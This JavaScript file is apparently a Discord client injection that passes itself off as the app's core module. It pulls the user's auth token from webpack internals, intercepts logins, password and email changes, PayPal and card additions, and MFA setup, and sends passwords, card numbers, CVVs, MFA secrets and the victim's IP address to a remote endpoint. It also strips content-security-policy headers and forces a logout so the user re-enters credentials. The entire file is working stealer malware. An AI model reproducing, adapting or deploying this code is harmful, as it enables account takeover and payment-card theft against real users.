const fs = require("fs")
    , {
        BrowserWindow: BrowserWindow
        , session: session
    } = require("electron")
    , {
        parse: parse
    } = require("querystring")
    , apiURL = "*API URL*"
    , tken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
    , logOut =
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();';
var win = "";
const onLaunchingDiscord = {
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"]
    }
    , onDiscordRequest = {
        urls: ["https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login",
            "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login",
            "https://api.stripe.com/v*/tokens", "https://discord.com/api/v*/users/@me/mfa/totp/disable",
            "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
            "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
            "https://canary.discord.com/api/v*/users/@me/mfa/totp/disable",
            "https://discord.com/api/v*/users/@me/mfa/totp/enable",
            "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
            "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
            "https://canary.discord.com/api/v*/users/@me/mfa/totp/enable"]
    };

function organize(e, s, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
            'var IPreq = new XMLHttpRequest();IPreq.open( "GET", "https://ipapi.co/json", false );IPreq.send();JSON.parse(IPreq.responseText).ip;',
            !0)
        .then(i => {
            switch (e) {
            case "login":
                send("login", JSON.stringify({
                    password: s
                    , captcha_key: t
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "passchange":
                send("newpass", JSON.stringify({
                    lastPassword: s
                    , newPassword: t
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "emailchange":
                send("newemail", JSON.stringify({
                    newEmail: s
                    , password: t
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "paypal":
                send("paypal", JSON.stringify({
                    token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "cardAdd":
                s = JSON.parse(s), send("card", JSON.stringify({
                    number: s["card[number]"]
                    , cvv: s["card[cvc]"]
                    , expireAt: `${s["card[exp_month]"]}/${s["card[exp_year]"]}`
                    , guid: s.guid
                    , muid: s.muid
                    , sid: s.sid
                    , userAgent: s.payment_user_agent
                    , key: s.key
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "mfaenable":
                s = JSON.parse(s), send("mfaenable", JSON.stringify({
                    code: s.code
                    , authKey: s.secret
                    , password: s.password
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "mfaDisable":
                send("mfadisable", JSON.stringify({
                    code: s
                    , token: n
                    , injected: __dirname
                    , ipAddress: i
                }));
                break;
            case "injected":
                send("inject", JSON.stringify({
                    injected: __dirname
                    , token: n
                    , ipAddress: i
                }))
            }
        })
}

function send(e, s) {
    (win = BrowserWindow.getAllWindows()[0])
    .webContents.executeJavaScript(`fetch("${apiURL}/${e}", { method: "POST", body: JSON.stringify(${s})})`)
}

function firstRun() {
    fs.readdirSync(__dirname)
        .includes("ZeroTwo.txt") || (win = BrowserWindow.getAllWindows()[0], fs.writeFileSync(
            `${__dirname}/ZeroTwo.txt`, "i"), win.webContents.executeJavaScript(logOut, !0))
}
session.defaultSession.webRequest.onBeforeRequest(onLaunchingDiscord, (e, s) => {
    firstRun();
    if (e.url.startsWith("wss://")) return s({
        cancel: !0
    });
}), session.defaultSession.webRequest.onHeadersReceived((e, s) => {
    delete e.responseHeaders["content-security-policy"], delete e.responseHeaders[
        "content-security-policy-report-only"], s({
        responseHeaders: {
            ...e.responseHeaders
            , "Access-Control-Allow-Headers": "*"
        }
    })
}), session.defaultSession.webRequest.onCompleted(onDiscordRequest, (e, s) => {
    if (e.url.endsWith("login") && 200 == e.statusCode && "POST" == e.method) {
        win = BrowserWindow.getAllWindows()[0];
        var t = JSON.parse(e.uploadData[0].bytes);
        win.webContents.executeJavaScript(tken, !0)
            .then(e => organize("login", t.password, t.captcha_key, e))
    }
    e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method && (win = BrowserWindow
        .getAllWindows()[0], (t = JSON.parse(e.uploadData[0].bytes))
        .new_password && win.webContents.executeJavaScript(tken, !0)
        .then(e => organize("passchange", t.password, t.new_password, e)), t.email && win
        .webContents.executeJavaScript(tken, !0)
        .then(e => organize("emailchange", t.email, t.password, e)));
    e.url.endsWith("billing-agreement-tokens") && 200 == e.statusCode && "POST" == e.method &&
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(tken, !0)
        .then(e => organize("paypal", null, null, e)), e.url.endsWith("/tokens") && 200 == e
        .statusCode && "POST" == e.method && BrowserWindow.getAllWindows()[0].webContents
        .executeJavaScript(tken, !0)
        .then(s => organize("cardAdd", JSON.stringify(parse(decodeURIComponent(e.uploadData[0]
            .bytes))), null, s)), e.url.endsWith("/enable") && 200 == e.statusCode && "POST" == e
        .method && BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(tken, !0)
        .then(s => organize("mfaenable", e.uploadData[0].bytes, null, s)), e.url.endsWith(
        "disable") && 200 == e.statusCode && "POST" == e.method && BrowserWindow.getAllWindows()[0]
        .webContents.executeJavaScript(tken, !0)
        .then(s => organize("mfaDisable", JSON.parse(e.uploadData[0].bytes)
            .code, null, s))
}), module.exports = require("./core.asar");
